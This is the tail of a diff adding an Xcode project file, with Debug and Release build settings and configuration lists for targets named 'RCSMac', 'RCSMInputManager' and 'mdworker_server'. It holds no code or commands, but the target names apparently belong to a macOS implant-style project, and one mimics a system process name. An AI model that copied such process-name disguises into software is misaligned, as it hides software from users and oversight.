+				SDKROOT = macosx10.7;
+				STRIP_INSTALLED_PRODUCT = NO;
+				USER_HEADER_SEARCH_PATHS = "..//**";
+				VALID_ARCHS = "i386 x86_64";
+			};
+			name = Debug;
+		};
+		C01FCF5008A954540054247B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = YES;
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				CODE_SIGN_IDENTITY = "";
+				COPY_PHASE_STRIP = NO;
+				DEAD_CODE_STRIPPING = NO;
+				FRAMEWORK_SEARCH_PATHS = "";
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_ENABLE_OBJC_GC = unsupported;
+				GCC_GENERATE_DEBUGGING_SYMBOLS = NO;
+				GCC_PREPROCESSOR_DEFINITIONS = "";
+				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
+				GCC_WARN_ABOUT_MISSING_PROTOTYPES = NO;
+				GCC_WARN_ABOUT_POINTER_SIGNEDNESS = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_MISSING_PARENTHESES = NO;
+				GCC_WARN_PEDANTIC = NO;
+				GCC_WARN_SIGN_COMPARE = NO;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				LIBRARY_SEARCH_PATHS = ".//**";
+				LINKER_DISPLAYS_MANGLED_NAMES = NO;
+				LINK_WITH_STANDARD_LIBRARIES = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = "-Wl,-search_paths_first";
+				SDKROOT = macosx10.7;
+				SEPARATE_STRIP = YES;
+				STANDARD_C_PLUS_PLUS_LIBRARY_TYPE = dynamic;
+				USER_HEADER_SEARCH_PATHS = "..//**";
+				VALID_ARCHS = "i386 x86_64";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		1A10795D12E720EE0063759B /* Build configuration list for PBXNativeTarget "Tests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				1A10795B12E720EE0063759B /* Debug */,
+				1A10795C12E720EE0063759B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		1AF6100D0FA72D8A003F2C12 /* Build configuration list for PBXNativeTarget "RCSMInputManager" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				1AF6100B0FA72D8A003F2C12 /* Debug */,
+				1AF6100C0FA72D8A003F2C12 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		529CA8AF1464304100B92C47 /* Build configuration list for PBXNativeTarget "mdworker_server" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				529CA8B01464304100B92C47 /* Debug */,
+				529CA8B11464304100B92C47 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C01FCF4A08A954540054247B /* Build configuration list for PBXNativeTarget "RCSMac" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C01FCF4B08A954540054247B /* Debug */,
+				C01FCF4C08A954540054247B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C01FCF4E08A954540054247B /* Build configuration list for PBXProject "RCSMac" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C01FCF4F08A954540054247B /* Debug */,
+				C01FCF5008A954540054247B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 29B97313FDCFA39411CA2CEA /* Project object */;
+}
